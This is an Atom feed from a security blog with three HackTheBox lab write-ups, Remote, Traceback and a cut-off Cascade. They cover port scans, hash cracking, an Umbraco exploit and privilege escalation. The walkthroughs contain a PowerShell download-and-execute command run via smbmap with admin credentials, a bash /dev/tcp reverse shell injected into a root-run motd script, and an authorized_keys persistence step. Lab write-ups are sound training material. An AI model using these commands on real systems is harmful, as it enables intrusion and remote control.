<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://gr0sabi.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gr0sabi.github.io/" rel="alternate" type="text/html" /><updated>2021-07-13T07:32:36-04:00</updated><id>https://gr0sabi.github.io/feed.xml</id><title type="html">gr0sabi@notes</title><subtitle>An information security blog. Various posts related to the struggle and pursuit of knowing a little about poking at machines.</subtitle><author><name>J.D. Grow</name></author><entry><title type="html">Remote Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/" rel="alternate" type="text/html" title="Remote Write-Up: HackTheBox" /><published>2020-09-05T00:00:00-04:00</published><updated>2020-09-05T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/remote-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\banner-remote.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had a cool privilege escalation. The initial Nmap scan showed multiple interesting ports - FTP with anonymous login, web server on port 80, SMB on 445 and a open NFS share. I started by connecting to FTP via the anonymous login, but it showed nothing interesting. Next, a quick enumeration of all available data on the http service led to an Umbraco login. I then connected the open NFS share on port 2049 and begun some real enumeration which allowed an extracted Administrator hash to the Umbraco application. Logging into Umbraco, I was able to exploit the application with a known CVE to obtain a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iss apppool&lt;/code&gt; and capture the User flag. After some system enumeration I discovered TeamViewer ver. 7.0.43148 installed which uses a shared AES key for all customer installations and published under CVE-2019-18988. This allowed a password to be decrypted that just so happened to a reused Administrator user password.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-remote 10.10.10.180&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.10.10.180         
Host is up (0.021s latency).              
Not shown: 65519 closed ports         
PORT      STATE SERVICE       VERSION 
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:                              
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 56s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T20:39:53
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;

&lt;p&gt;Initially looking at the web page we can see a link to Intranet. 
&lt;img src=&quot;\assets\images\htb\remote\acme-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following with clicking the Intranet link, we then see a link to Login which brings us to this Umbraco application. I attempted basic credentials and basic authentication assessment, but had no luck gaining access. 
&lt;img src=&quot;\assets\images\htb\remote\umbraco-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;nfs-enumeration&quot;&gt;NFS Enumeration&lt;/h2&gt;

&lt;p&gt;The Network File System (NFS) is an interesting find in the port scan. Taking a closer look, we see a mountable share &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site_backups&lt;/code&gt;.
&lt;img src=&quot;\assets\images\htb\remote\showmount.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount -t nfs 10.10.10.180:/site_backups nfs/&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\remote\site_backups.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some enumeration, I located an interesting hash.
&lt;img src=&quot;\assets\images\htb\remote\umbraco-sdf-hash.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cracking the hash allows us to login to the Umbraco web application with Admin/Administrator.
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\remote\umbraco-logged-in.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Umbraco version 7.12.4 was found in the “Help Area” which lines up with an exploit found in searchsploit.
&lt;img src=&quot;\assets\images\htb\remote\searchsploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used some GoogleFu and found another exploit PoC that I liked better here: https://github.com/noraj/Umbraco-RCE&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\poc-command-exec.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I served a modified Nishang Reverse-Tcp PowerShell script to return a shell:
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
&lt;img src=&quot;\assets\images\htb\remote\nishang-exec.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\listener.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;User.txt was found in C:\Users\Public
&lt;img src=&quot;\assets\images\htb\remote\remote-user-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting, TeamViewer…
&lt;img src=&quot;\assets\images\htb\remote\get-process-remote.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a bit of enumeration and research into known Teamviewer vulnerabilities, I located a blog post which describes that the password can be extracted and has the potential to be reused as other users. Looked promising. I located the necessary hashes in the below registry entry.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\windows\system32\inetsrv&amp;gt; reg query HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY
[TRUNCATED OUTPUT]    
    LastMACUsed    REG_MULTI_SZ    \0005056B984A2
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x5e8d3439
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\remote\decryption.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://whynotsecurity.com/blog/teamviewer/&quot; target=&quot;_blank&quot;&gt;Decryption script and writeup.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I reused my original Nishang shell script and SMBMap to escalate.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap -u administrator -p '!R3m0te!' -H 10.10.10.180 -x &quot;powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/shell.ps1')&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pop!
&lt;img src=&quot;\assets\images\htb\remote\root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><category term="CVE" /><category term="windows" /><summary type="html">Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had unexpected privilege escalation. An open NFS share allowed initial enumeration</summary></entry><entry><title type="html">Traceback Write-Up - HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/traceback-write-up-hackthebox/" rel="alternate" type="text/html" title="Traceback Write-Up - HackTheBox" /><published>2020-08-15T00:00:00-04:00</published><updated>2020-08-15T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/traceback-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/traceback-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\traceback\banner-traceback.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation of privileges. The port scan showed SSH and an Apache server running on port 80. Looking at the web server, it showed a compromised web page with an interesting comment in the source code referring to the “best web shells you might need.” Googling that comment revealed a Github repository with various webshells. I created a wordlist with the names of the webshells and did a quick enum of the root directory of the server and it revealed an active web shell. Utilizing the web shell, I uploaded and executed my own php reverse shell as not to disturb other HackTheBox members. Logged in as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin&lt;/code&gt; user I quickly discovered that I had sudo privilege to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/sysadmin/luvit&lt;/code&gt; as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; user, which allowed execution of bash as that user. Continuing on I noticed an interesting update to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d/&lt;/code&gt; being by root. That, coupled with an interesting set of group permissions that allowed the sysadmin user to write to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d/&lt;/code&gt; I began to explore a vector. The update-motd.d scripts are executed by the root user at each interactive shell login. Therefore, since we have write ability to those files, we could essentially execute a command as the root user once triggering a login. I echo’d in a public key into sysadmin’s authorized_keys file to be able to trigger a login and echo’d in a simple bash reverse shell in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d/00-header&lt;/code&gt; file. I set up a listener and logged in via SSH to sysadmin triggering a shell as root on my listener.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-traceback 10.10.10.181&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 15:41 EDT
Nmap scan report for 10.10.10.181
Host is up (0.027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;

&lt;p&gt;Rustbuster revealed a shell.php file (at the time I didn’t realize it was another HTB member). Essentially, nothing useful here.
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/rustbuster/rustbuster dir -u http://10.10.10.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\traceback\rustbuster-traceback.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A look at the pwned web page telling us he left a backdoor. How Nice!
&lt;img src=&quot;\assets\images\htb\traceback\pwnd-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting comment left in the source code:
&lt;img src=&quot;\assets\images\htb\traceback\source-code-comment.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Searching Google for the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Some of the best web shells that you might need&lt;/code&gt; reveals a Github repository with… you guessed it - Web Shells! &lt;a href=&quot;https://github.com/TheBinitGhimire/Web-Shells&quot;&gt;https://github.com/TheBinitGhimire/Web-Shells&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I compiled a list of the filenames of the web-shells and ran it through rustbuster: 
&lt;img src=&quot;\assets\images\htb\traceback\webshell-rustbuster.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the shell, we get a login prompt.
&lt;img src=&quot;\assets\images\htb\traceback\smevk-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Browsing the source code of the web-shell, the creds are admin/admin. It appears other HTB users are here, so not to disturb I will upload my own reverse TCP PHP script to get a shell.
&lt;img src=&quot;\assets\images\htb\traceback\smevk-logged-in.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h2&gt;
&lt;p&gt;Browsing to my shell to execute, we get a return on the listener.
&lt;img src=&quot;\assets\images\htb\traceback\webadmin-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a quick win, I always check sudo permissions of the user I’m logged in as.
&lt;img src=&quot;\assets\images\htb\traceback\webadmin-sudo-perm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ah, a note left for us. How considerate!
&lt;img src=&quot;\assets\images\htb\traceback\webadmin-note.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pivoting-to-sysadmin&quot;&gt;Pivoting To SysAdmin&lt;/h2&gt;
&lt;p&gt;Between the note and the discovered sudo permission, we can use Luvit to execute a shell as the sysadmin user.
&lt;img src=&quot;\assets\images\htb\traceback\sysadmin-lua-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reference for os.execute: &lt;a href=&quot;http://lua-users.org/wiki/OsLibraryTutorial&quot;&gt;http://lua-users.org/wiki/OsLibraryTutorial&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This allowed us to capture the user flag.
&lt;img src=&quot;\assets\images\htb\traceback\user-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;During enumeration with linPEAS the first thing I noticed was Root was running this command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In addition we had some interesting permissions:
&lt;img src=&quot;\assets\images\htb\traceback\linpeas-traceback.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to Ubuntu, the update-motd.d scripts are executed by the root user at each interactive shell login. Therefore, since we have write ability to those files, we could essentially execute a command as the root user once triggering a login.
Ref: &lt;a href=&quot;http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html&quot;&gt;http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The first thing I did was establish the ability to easily log in by adding a public key to Sysadmin’s authorized_keys.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSNvfyEGfS+x+g6G7FLv9bVfvOOmfQC9Ot7P/IxDaSKKVsU8fbebwLBw+Ts2QyLAqejmCauO8Rc5vi1opAuFF/a6rIfduXO1BUSDtvbQQ9Qz3JEmSILUL3N8doPEVjAooGH04IPL4++ObrbKkkrRLmicVJHYTehlYhUTtVhcgVLN9wqJgkRYeSDu/EBSrWBZuulzGwpXYH8mG3KjWHK+5E0PZLyYWIdIiOLHVDPgAWH++agnnz7Jei8YhBt6FoJMHFZtUQ0jM1jmSCLoKGO2GAeD0+KQFfuXlf3Z5JH527v89vFJWBTRkFyuGjTDoEU07qZPSYcmnxPStiJmDHZMMvQiF9lYOadq1MnDG36SAFAFs78/gJI9Apybn78peXSD9auqoQ73LBn9SwUiHcA1/rExmD9jCA82sQjltpwHyl5bSH4/VgaJl41w9GaF+puz+rdBfikxz8GCDpQZxSgSpzIMY6IwyPWF6uH1HJLhG5oXrvfsCXMYL/kc2+7hXo6Y0= kali@kali&quot; &amp;gt;&amp;gt; /home/sysadmin/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;and-were-root&quot;&gt;And We’re Root&lt;/h2&gt;
&lt;p&gt;Next, I set up a netcat listener on port 9001. I echo’d a Bash Reverse Shell into the 00-header file, and logged in via SSH with Sysadmin to trigger the MOTD execution. And it worked!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.37/9001 0&amp;gt;&amp;amp;1'&quot; &amp;gt;&amp;gt; /etc/update-motd.d/00-header&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\traceback\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><category term="linux" /><summary type="html">Traceback was an easy-rated, Linux machine made by Xh4H on HackTheBox that allowed some Lua interaction and unique escalation vector.</summary></entry><entry><title type="html">Cascade Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox/" rel="alternate" type="text/html" title="Cascade Write-Up: HackTheBox" /><published>2020-07-25T00:00:00-04:00</published><updated>2020-07-25T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/cascade-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\cascade\cascade-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Cascade is a well-made, straight-forward machine that is a fun enumeration exercise and requires a bit of .NET debugging. Port enumeration reveals an open LDAP service that is used to dump user objects. One user (Ryan Thompson) has a custom attribute (cascadeLegacyPwd) that reveals a Base64-encoded password which allows SMB authentication to read a shared folder (Data). Within the shared folder a VNC registry file leaks the encrypted password of another user (s.smith) which (once unecrypted) the user access to read a different SMB share (Audit$). Within the new shared folder, an insecurely written .NET application can be obtained and debugged to decrypt the password of a custom service user (ArkSvc). With the custom service user (ArkSvc), a deleted Active Directory object of a temporary admin account with the same custom attribute (cascadeLegacyPwd) can be obtained. This attribute can be decoded and is an identical (reused) password to the Administrator account.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/cascade-full 10.10.10.182
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-03-31 19:27 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.182
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.023s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2020-03-31 23:32:04Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: cascade.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: cascade.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m49s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2020-03-31T23:32:53
|_  start_date: 2020-03-31T21:10:59
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h2&gt;

&lt;p&gt;Enumerating LDAP we see an interesting attribute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cascadeLegacyPwd&lt;/code&gt;. The Base64 value decodes to what appears to be a password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rY4n5eva&lt;/code&gt;. 
&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-user-object.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Commands Utilized:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=cascade,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ldap-out.txt
ldapsearch &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=cascade,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'(objectClass=Person)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ldap-object-person.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h2&gt;

&lt;p&gt;Our new friend Ryan can read some interesting an interesting share called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;.
&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-smb1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see what’s inside.
&lt;img src=&quot;\assets\images\htb\cascade\cacade-ryan-smb2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This data looks worthwhile. Let’s mount it to get a closer look at these files.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;r.thompson //10.10.10.182/Data /mnt/smb-data/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Three files really stood out to me. The first is the meeting notes, which make a point to let us know about a TempAdmin account that has the same password as the normal admin account.
&lt;img src=&quot;\assets\images\htb\cascade\meeting-notes-html.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This next file is interesting. It shows the ArkSvc user running an application that shows the deletion the TempAdmin account (mentioned in the above “Meeting Notes”) with object location.
&lt;img src=&quot;\assets\images\htb\cascade\ark-log.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The last interesting file, VNC Install.reg, in s.smith’s directory, contained the VNC encrypted password:&lt;/p&gt;
